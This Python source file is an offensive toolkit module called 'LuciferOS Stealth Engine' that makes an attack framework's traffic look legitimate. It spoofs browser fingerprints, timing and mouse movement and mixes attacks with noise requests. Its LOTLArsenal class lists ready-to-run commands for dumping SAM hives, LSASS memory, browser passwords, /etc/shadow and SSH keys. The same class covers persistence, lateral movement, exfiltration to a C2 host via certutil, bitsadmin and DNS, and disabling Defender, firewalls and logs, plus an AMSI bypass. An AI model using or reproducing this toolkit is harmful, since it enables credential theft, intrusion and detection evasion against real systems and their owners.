#!/usr/bin/env python3
"""
LuciferOS Stealth Engine
Plausibility over silence - blend in, don't hide
"""

import random
import time
import hashlib
from typing import List, Dict, Optional, Callable
from datetime import datetime
import threading

class StealthEngine:
    """
    Makes LILITH's attacks look like legitimate traffic
    """
    
    # Real user agents from actual browsers
    USER_AGENTS = [
        # Chrome Windows
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        # Firefox Windows
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        # Edge
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        # Chrome Mac
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        # Safari Mac
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
        # Chrome Linux
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        # Mobile
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36",
    ]
    
    # Common referrers
    REFERRERS = [
        "https://www.google.com/",
        "https://www.bing.com/",
        "https://duckduckgo.com/",
        "https://www.facebook.com/",
        "https://twitter.com/",
        "https://www.linkedin.com/",
        "https://www.reddit.com/",
        None,  # Direct traffic
    ]
    
    # Legitimate-looking headers
    ACCEPT_HEADERS = [
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    ]
    
    ACCEPT_LANGUAGE = [
        "en-US,en;q=0.9",
        "en-GB,en;q=0.9,en-US;q=0.8",
        "en-US,en;q=0.9,es;q=0.8",
        "en,en-US;q=0.9",
    ]
    
    def __init__(self, mode: str = "normal"):
        """
        Initialize stealth engine
        mode: 'aggressive' (fast, less stealthy), 'normal', 'paranoid' (slow, very stealthy)
        """
        self.mode = mode
        self.request_count = 0
        self.session_start = datetime.now()
        self._current_ua = None
        self._current_fingerprint = None
        self.lock = threading.Lock()
        
        # Timing profiles
        self.timing_profiles = {
            'aggressive': (0.1, 0.5),    # 100-500ms between requests
            'normal': (0.5, 3.0),         # 0.5-3s between requests
            'paranoid': (2.0, 10.0),      # 2-10s between requests
        }
        
        # Initialize consistent browser fingerprint for this session
        self._generate_fingerprint()
    
    def _generate_fingerprint(self):
        """Generate a consistent browser fingerprint for this session"""
        self._current_ua = random.choice(self.USER_AGENTS)
        
        # Determine browser type from UA
        if 'Chrome' in self._current_ua and 'Edg' not in self._current_ua:
            browser = 'chrome'
        elif 'Firefox' in self._current_ua:
            browser = 'firefox'
        elif 'Safari' in self._current_ua and 'Chrome' not in self._current_ua:
            browser = 'safari'
        elif 'Edg' in self._current_ua:
            browser = 'edge'
        else:
            browser = 'chrome'
        
        # Screen resolutions that match the UA
        if 'Mobile' in self._current_ua or 'iPhone' in self._current_ua:
            screens = [(375, 812), (390, 844), (414, 896), (360, 800)]
        else:
            screens = [(1920, 1080), (2560, 1440), (1366, 768), (1536, 864), (1440, 900)]
        
        screen = random.choice(screens)
        
        self._current_fingerprint = {
            'user_agent': self._current_ua,
            'browser': browser,
            'screen_width': screen[0],
            'screen_height': screen[1],
            'color_depth': random.choice([24, 32]),
            'timezone_offset': random.choice([-480, -420, -360, -300, -240, 0, 60, 120]),
            'language': random.choice(['en-US', 'en-GB', 'en']),
            'platform': 'Win32' if 'Windows' in self._current_ua else ('MacIntel' if 'Mac' in self._current_ua else 'Linux x86_64'),
            'plugins_count': random.randint(3, 7),
            'canvas_hash': hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
        }
    
    def get_headers(self, target_url: str = None) -> Dict[str, str]:
        """Get stealth headers for a request"""
        headers = {
            'User-Agent': self._current_fingerprint['user_agent'],
            'Accept': random.choice(self.ACCEPT_HEADERS),
            'Accept-Language': random.choice(self.ACCEPT_LANGUAGE),
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
        }
        
        # Add referrer sometimes
        if random.random() > 0.3:
            ref = random.choice(self.REFERRERS)
            if ref:
                headers['Referer'] = ref
        
        # Chrome-specific headers
        if 'Chrome' in self._current_fingerprint['user_agent']:
            headers['sec-ch-ua'] = '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"'
            headers['sec-ch-ua-mobile'] = '?0'
            headers['sec-ch-ua-platform'] = '"Windows"' if 'Windows' in self._current_fingerprint['user_agent'] else '"macOS"'
        
        return headers
    
    def wait(self, multiplier: float = 1.0):
        """Wait a human-like amount of time between requests"""
        min_delay, max_delay = self.timing_profiles[self.mode]
        delay = random.uniform(min_delay, max_delay) * multiplier
        
        # Add some jitter
        if random.random() > 0.7:
            delay += random.uniform(0, 1)
        
        time.sleep(delay)
    
    def should_pause(self) -> bool:
        """Check if we should take a longer pause (simulate human breaks)"""
        with self.lock:
            self.request_count += 1
            
            # Every 20-50 requests, take a longer break
            if self.request_count % random.randint(20, 50) == 0:
                return True
            
            # Random chance of pause
            if self.mode == 'paranoid' and random.random() > 0.95:
                return True
            
            return False
    
    def take_break(self):
        """Take a longer break to simulate human behavior"""
        if self.mode == 'aggressive':
            time.sleep(random.uniform(2, 5))
        elif self.mode == 'normal':
            time.sleep(random.uniform(5, 15))
        else:  # paranoid
            time.sleep(random.uniform(30, 120))
    
    def get_browser_fingerprint(self) -> Dict:
        """Get the current browser fingerprint"""
        return self._current_fingerprint.copy()
    
    def rotate_identity(self):
        """Get a new browser identity"""
        self._generate_fingerprint()
        return self._current_fingerprint
    
    def get_typing_delays(self, text: str) -> List[float]:
        """Get realistic typing delays for text input"""
        delays = []
        for i, char in enumerate(text):
            # Base delay
            if char == ' ':
                delay = random.uniform(0.05, 0.15)
            elif char in '.,!?':
                delay = random.uniform(0.1, 0.3)
            else:
                delay = random.uniform(0.03, 0.12)
            
            # Occasional longer pauses (thinking)
            if random.random() > 0.95:
                delay += random.uniform(0.2, 0.8)
            
            delays.append(delay)
        
        return delays
    
    def get_mouse_path(self, start: tuple, end: tuple, steps: int = 20) -> List[tuple]:
        """Generate a realistic mouse movement path"""
        path = []
        
        # Bezier curve control points for natural movement
        ctrl1 = (
            start[0] + random.uniform(-50, 50) + (end[0] - start[0]) * 0.3,
            start[1] + random.uniform(-50, 50) + (end[1] - start[1]) * 0.3
        )
        ctrl2 = (
            start[0] + random.uniform(-50, 50) + (end[0] - start[0]) * 0.7,
            start[1] + random.uniform(-50, 50) + (end[1] - start[1]) * 0.7
        )
        
        for i in range(steps + 1):
            t = i / steps
            # Cubic bezier curve
            x = (1-t)**3 * start[0] + 3*(1-t)**2*t * ctrl1[0] + 3*(1-t)*t**2 * ctrl2[0] + t**3 * end[0]
            y = (1-t)**3 * start[1] + 3*(1-t)**2*t * ctrl1[1] + 3*(1-t)*t**2 * ctrl2[1] + t**3 * end[1]
            
            # Add small random jitter
            x += random.uniform(-2, 2)
            y += random.uniform(-2, 2)
            
            path.append((int(x), int(y)))
        
        return path


class LOTLArsenal:
    """
    Living Off The Land - use built-in tools only
    No dropped binaries, no detection
    """
    
    # Windows LOTL commands
    WINDOWS_COMMANDS = {
        'recon': {
            'system_info': 'systeminfo',
            'network_config': 'ipconfig /all',
            'arp_table': 'arp -a',
            'routing_table': 'route print',
            'dns_cache': 'ipconfig /displaydns',
            'netstat': 'netstat -ano',
            'users': 'net user',
            'groups': 'net localgroup',
            'domain_users': 'net user /domain',
            'shares': 'net share',
            'sessions': 'net session',
            'processes': 'tasklist /v',
            'services': 'sc query state= all',
            'scheduled_tasks': 'schtasks /query /fo LIST /v',
            'installed_software': 'wmic product get name,version',
            'hotfixes': 'wmic qfe list',
            'startup_items': 'wmic startup get caption,command',
        },
        'credential_access': {
            'sam_dump': 'reg save HKLM\\SAM sam.save',
            'system_dump': 'reg save HKLM\\SYSTEM system.save',
            'security_dump': 'reg save HKLM\\SECURITY security.save',
            'lsass_dump': 'rundll32.exe comsvcs.dll MiniDump {PID} lsass.dmp full',
            'wifi_passwords': 'netsh wlan show profiles name=* key=clear',
            'credential_manager': 'cmdkey /list',
            'chrome_passwords': 'copy "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data" .',
            'firefox_passwords': 'copy "%APPDATA%\\Mozilla\\Firefox\\Profiles\\*\\logins.json" .',
        },
        'persistence': {
            'registry_run': 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {name} /t REG_SZ /d "{cmd}" /f',
            'scheduled_task': 'schtasks /create /tn "{name}" /tr "{cmd}" /sc onlogon /ru SYSTEM',
            'service_create': 'sc create {name} binPath= "{cmd}" start= auto',
            'wmi_subscription': 'wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name="{name}"',
        },
        'lateral_movement': {
            'psexec_like': 'wmic /node:{target} process call create "{cmd}"',
            'winrm': 'winrs -r:{target} {cmd}',
            'schtasks_remote': 'schtasks /create /s {target} /tn "{name}" /tr "{cmd}" /sc once /st 00:00',
            'copy_smb': 'copy {file} \\\\{target}\\c$\\windows\\temp\\',
        },
        'exfiltration': {
            'dns_exfil': 'nslookup {data}.{domain}',
            'http_exfil': 'certutil -urlcache -split -f http://{c2}/{file} {file}',
            'smb_copy': 'copy {file} \\\\{target}\\share\\',
            'bitsadmin': 'bitsadmin /transfer job /download /priority high http://{c2}/{file} {dest}',
        },
        'defense_evasion': {
            'disable_defender': 'Set-MpPreference -DisableRealtimeMonitoring $true',
            'disable_firewall': 'netsh advfirewall set allprofiles state off',
            'clear_logs': 'wevtutil cl Security & wevtutil cl System & wevtutil cl Application',
            'timestomp': 'powershell (Get-Item {file}).LastWriteTime = "{date}"',
            'amsi_bypass': '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)',
        },
    }
    
    # Linux LOTL commands
    LINUX_COMMANDS = {
        'recon': {
            'system_info': 'uname -a; cat /etc/*release',
            'network_config': 'ip addr; ip route',
            'arp_table': 'ip neigh',
            'netstat': 'ss -tulpn',
            'users': 'cat /etc/passwd',
            'groups': 'cat /etc/group',
            'processes': 'ps auxf',
            'services': 'systemctl list-units --type=service',
            'crontabs': 'cat /etc/crontab; ls -la /etc/cron.*',
            'suid_files': 'find / -perm -4000 2>/dev/null',
            'writable_dirs': 'find / -writable -type d 2>/dev/null',
        },
        'credential_access': {
            'shadow': 'cat /etc/shadow',
            'ssh_keys': 'find / -name "id_rsa*" 2>/dev/null',
            'bash_history': 'cat ~/.bash_history',
            'env_vars': 'env; printenv',
            'memory_dump': 'strings /dev/mem 2>/dev/null | grep -i password',
        },
        'persistence': {
            'crontab': 'echo "* * * * * {cmd}" >> /etc/crontab',
            'bashrc': 'echo "{cmd}" >> ~/.bashrc',
            'ssh_key': 'echo "{key}" >> ~/.ssh/authorized_keys',
            'ld_preload': 'echo "/tmp/evil.so" >> /etc/ld.so.preload',
        },
        'lateral_movement': {
            'ssh': 'ssh {user}@{target} "{cmd}"',
            'scp': 'scp {file} {user}@{target}:{dest}',
        },
    }
    
    @classmethod
    def get_command(cls, category: str, action: str, platform: str = 'windows', **kwargs) -> str:
        """Get a LOTL command with parameters filled in"""
        if platform.lower() == 'windows':
            commands = cls.WINDOWS_COMMANDS
        else:
            commands = cls.LINUX_COMMANDS
        
        if category not in commands:
            return None
        if action not in commands[category]:
            return None
        
        cmd = commands[category][action]
        
        # Fill in parameters
        for key, value in kwargs.items():
            cmd = cmd.replace('{' + key + '}', str(value))
        
        return cmd
    
    @classmethod
    def get_recon_chain(cls, platform: str = 'windows') -> List[str]:
        """Get a full recon chain"""
        commands = cls.WINDOWS_COMMANDS if platform == 'windows' else cls.LINUX_COMMANDS
        return list(commands['recon'].values())


class TrafficMimicry:
    """
    Mix attack traffic with legitimate-looking requests
    """
    
    # Legitimate URLs to visit for noise
    NOISE_URLS = [
        "https://www.google.com/search?q=weather",
        "https://www.wikipedia.org/",
        "https://news.ycombinator.com/",
        "https://www.github.com/",
        "https://stackoverflow.com/",
        "https://www.reddit.com/",
    ]
    
    def __init__(self, ratio: float = 0.3):
        """
        ratio: percentage of traffic that should be noise (0.0-1.0)
        """
        self.ratio = ratio
        self.stealth = StealthEngine()
    
    def should_add_noise(self) -> bool:
        """Check if we should add a noise request"""
        return random.random() < self.ratio
    
    def get_noise_url(self) -> str:
        """Get a random legitimate URL to visit"""
        return random.choice(self.NOISE_URLS)
    
    def wrap_attack(self, attack_func: Callable, *args, **kwargs):
        """Wrap an attack function with noise and delays"""
        # Pre-attack noise
        if self.should_add_noise():
            # Would make a request to noise URL here
            self.stealth.wait()
        
        # Stealth delay
        self.stealth.wait()
        
        # Execute attack
        result = attack_func(*args, **kwargs)
        
        # Post-attack noise
        if self.should_add_noise():
            self.stealth.wait()
        
        return result


# Global stealth engine
_stealth = None

def get_stealth(mode: str = "normal") -> StealthEngine:
    """Get the global stealth engine"""
    global _stealth
    if _stealth is None:
        _stealth = StealthEngine(mode)
    return _stealth


if __name__ == "__main__":
    # Test stealth engine
    stealth = StealthEngine("normal")
    
    print("=== Stealth Headers ===")
    print(stealth.get_headers())
    
    print("\n=== Browser Fingerprint ===")
    print(stealth.get_browser_fingerprint())
    
    print("\n=== LOTL Recon Commands ===")
    for cmd in LOTLArsenal.get_recon_chain('windows')[:5]:
        print(f"  {cmd}")
    
    print("\n=== Sample LOTL Command ===")
    print(LOTLArsenal.get_command('lateral_movement', 'psexec_like', 'windows', 
                                   target='192.168.1.100', cmd='whoami'))
